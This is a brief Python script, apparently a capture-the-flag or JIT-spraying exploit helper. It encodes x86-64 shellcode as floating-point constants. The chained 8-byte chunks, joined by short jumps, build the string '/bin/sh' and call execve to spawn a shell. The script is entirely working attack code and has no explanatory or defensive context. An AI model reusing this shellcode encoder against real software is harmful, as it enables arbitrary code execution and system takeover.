import struct

def encode_data(dat):
    if len(dat) <= 8:
        dat = dat.ljust(8, b'\x00')
    else:
        print("can only encode 8 bytes")
    return str(struct.unpack("d", dat)[0]) + ";"

# int3 * 4
print(encode_data(b"\xcc\xcc\xcc\xcc\xcc\xeb\x06"))
# mov edi /bin
print(encode_data(b"\xbf/bin\xeb\x06"))
# mov edx /sh\x00
print(encode_data(b"\xba/sh\x00\xeb\x06"))
# shl rdx, 32; nop
print(encode_data(b"\x48\xc1\xe2\x20\x90\xeb\x06"))
# or rdi, rdx; push rdi; nop
print(encode_data(b"\x48\x09\xd7\x57\x90\xeb\x06"))
# mov rdi, rsp; xor eax, eax
print(encode_data(b"\x48\x89\xe7\x31\xc0\xeb\x06"))
# mov al, 59; xor esi, esi
print(encode_data(b"\xb0\x3b\x31\xf6\x90\xeb\x06"))
# xor edx, edx; syscall
print(encode_data(b"\x31\xd2\x0f\x05\x90\xeb\x06"))
